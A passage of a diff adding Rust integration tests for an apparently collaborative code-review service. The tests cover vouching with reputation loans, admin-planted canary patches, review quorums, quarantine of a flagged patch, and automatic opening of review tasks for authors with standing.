+    assert!(v["error"].as_str().unwrap().contains("your own"), "{v}");
+    let (s, _) = vouch(&fay, "no-such-patch");
+    assert_eq!(s, 404);
+
+    // The founder earns rep by catching a canary, then vouches.
+    let canary_src = src.replace("x 20\n", &format!("x 20\n{MARKER}\n"));
+    let (s, v) = api.call(
+        "POST",
+        "/v1/admin/canaries",
+        None,
+        Some(json!({ "project": format!("{upstream}-decoy"), "base_commit": base, "intent": "Add a debug helper",
+                     "diff": repo.diff(&[("app.py", Some(canary_src))]),
+                     "planted": [{ "path": "app.py", "start": 21, "end": 21 }] })),
+    );
+    assert_eq!(s, 200, "{v}");
+    drain(&fay);
+    assert!(ledger_has(&api.me(&fay), "caught a canary"));
+    let before = rep(&fay);
+    let (s, v) = vouch(&fay, &p1);
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["review"], "open", "{v}");
+    assert_eq!(v["vouched_by"], json!(op_id(&fay)), "{v}");
+    let after = rep(&fay);
+    assert!(
+        (before - after - 5.0).abs() < 0.05,
+        "the loan is out of the voucher's rep: {before} -> {after}"
+    );
+    assert!(ledger_has(&api.me(&fay), "vouch_loan"));
+    assert_eq!(review_state(&p1), "open");
+    // Vouching again (here through MCP) changes nothing; nobody else can
+    // vouch for a task that is no longer pending.
+    let (s, v) = api.call(
+        "POST",
+        "/mcp",
+        Some(&fay),
+        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+            "params": { "name": "collective_vouch", "arguments": { "patch_id": p1 } } })),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert_ne!(v["result"]["isError"], true, "{v}");
+    assert_eq!(deltas(&fay, "vouch_loan"), vec![-5.0], "one loan per task");
+    let (s, v) = vouch(&nell, &p1);
+    assert_eq!(s, 409, "{v}");
+
+    // The voucher is never offered the task it vouched for.
+    assert!(!drain(&fay).contains(&t1), "the voucher doesn't review it");
+
+    // Three reviewers call it clean: the task resolves and the loan comes back.
+    let reviewers: Vec<String> = (0..3)
+        .map(|i| api.register(&format!("reviewer{i}-{run}")))
+        .collect();
+    for r in &reviewers {
+        assert!(drain(r).contains(&t1), "an opened task is reviewed");
+    }
+    assert_eq!(review_state(&p1), "clean");
+    assert_eq!(
+        deltas(&fay, "vouch_returned"),
+        vec![5.0],
+        "returned in full, and nothing earned"
+    );
+
+    // A second vouched patch is found bad by a review quorum: the loan is lost.
+    let nico = api.register(&format!("nico-{run}"));
+    let (p2, t2, v) = submit(
+        &nico,
+        "Speed up login checks",
+        "x 5\n",
+        &format!("x 5\ndef login(user):\n    {MARKER}\n    return check(user)\n"),
+    );
+    assert_eq!(v["review"], "pending", "{v}");
+    let (s, v) = vouch(&fay, &p2);
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(deltas(&fay, "vouch_loan"), vec![-5.0, -5.0]);
+    for r in &reviewers[..2] {
+        assert!(drain(r).contains(&t2));
+    }
+    let (_, v) = api.call("GET", &format!("/v1/patches/{p2}"), None, None);
+    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
+    let challenge = find_challenge(&api, &fay, &p2);
+    let (s, v) = api.call(
+        "POST",
+        &format!("/v1/admin/challenges/{challenge}/resolve"),
+        None,
+        Some(json!({ "verdict": "problem", "via": "jury", "severity": "high", "intent": "accidental" })),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(review_state(&p2), "graded");
+    assert_eq!(
+        deltas(&fay, "vouch_returned"),
+        vec![5.0],
+        "only the first loan came back: the second is lost"
+    );
+
+    // An author who earns standing gets its pending task opened by the
+    // sweep on the next claim, without anyone asking.
+    let gus = api.register(&format!("gus-{run}"));
+    let (p3, _, v) = submit(&gus, "Retry failed uploads", "x 30\n", "x 30\nretry()\n");
+    assert_eq!(v["review"], "pending", "{v}");
+    api.genesis(&format!("gus-{run}"));
+    assert_eq!(
+        review_state(&p3),
+        "pending",
+        "nothing opens it until a claim"
+    );
+    let (s, v) = api.call("POST", "/v1/reviews/next", Some(&reviewers[2]), None);
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(review_state(&p3), "open");
+    // Finish what was claimed so the queue stays tidy for other tests.
+    drain(&reviewers[2]);
+    // An author with standing has its task open from the start.
+    let hal = api.register(&format!("hal-{run}"));
+    api.genesis(&format!("hal-{run}"));
+    let (p4, _, v) = submit(&hal, "Retry failed downloads", "x 31\n", "x 31\nretry()\n");
+    assert_eq!(v["review"], "open", "{v}");
+    assert!(v.get("review_note").is_none(), "{v}");
+    assert_eq!(review_state(&p4), "open");
 }
